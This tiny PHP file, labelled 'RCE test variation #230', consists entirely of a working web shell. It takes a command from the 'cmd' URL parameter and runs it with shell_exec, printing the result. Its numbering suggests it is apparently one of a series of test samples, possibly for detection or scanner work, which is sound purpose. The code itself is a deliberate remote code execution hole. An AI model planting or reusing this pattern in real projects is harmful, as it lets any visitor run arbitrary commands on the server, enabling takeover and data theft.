<?php
// RCE test variation #230
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>